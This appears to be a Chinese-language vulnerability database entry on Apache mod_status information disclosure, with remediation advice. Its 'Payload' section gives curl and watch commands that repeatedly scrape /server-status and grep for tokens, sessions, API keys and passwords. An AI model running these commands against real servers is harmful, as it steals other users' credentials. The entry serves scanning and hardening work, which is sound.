---
id: HTTPD-MOD-STATUS
title: Apache mod_status 信息泄露
product: httpd
vendor: Apache
version_affected: "任意版本（配置相关）"
severity: MEDIUM
tags: [information_disclosure, 无需认证]
fingerprint: ["Apache", "httpd"]
---

## 漏洞描述

Apache HTTP Server 的 `mod_status` 模块提供 `/server-status` 页面，用于监控服务器运行状态。当该页面未限制访问权限时，攻击者可以获取大量敏感信息，包括当前正在处理的所有请求 URL（可能包含 Session ID、Token、API Key 等）、服务器版本、运行时间、请求速率等。

## 影响版本

- 任意版本（取决于配置）

## 前置条件

- 无需认证
- 目标 Apache 启用了 `mod_status` 且 `/server-status` 未设置访问限制

## 利用步骤

1. 访问 `/server-status` 页面
2. 分析页面中正在处理的请求，提取敏感信息（Session、Token 等）
3. 持续监控页面以捕获更多敏感请求

## Payload

```bash
# 访问 server-status
curl http://TARGET/server-status

# 带详情的 server-status
curl "http://TARGET/server-status?auto"

# 提取正在处理的请求中的敏感参数
curl -s http://TARGET/server-status | grep -iE "token|session|api_key|password|auth"

# 持续监控（每 5 秒刷新）
watch -n 5 'curl -s http://TARGET/server-status | grep -iE "token|session|key"'
```

## 验证方法

```bash
# 检查 server-status 是否可访问
curl -sI http://TARGET/server-status | head -1
# 200 OK 表示可访问，漏洞存在

# 检查是否泄露请求信息
curl -s http://TARGET/server-status | grep -c "GET\|POST"
# 返回数字大于 0 表示泄露了正在处理的请求
```

## 修复建议

1. 限制 `/server-status` 的访问来源为管理 IP：
   ```apache
   <Location /server-status>
       SetHandler server-status
       Require ip 127.0.0.1 10.0.0.0/8
   </Location>
   ```
2. 如非必要，禁用 `mod_status` 模块
3. 确保 `ExtendedStatus Off`（减少泄露的信息量）
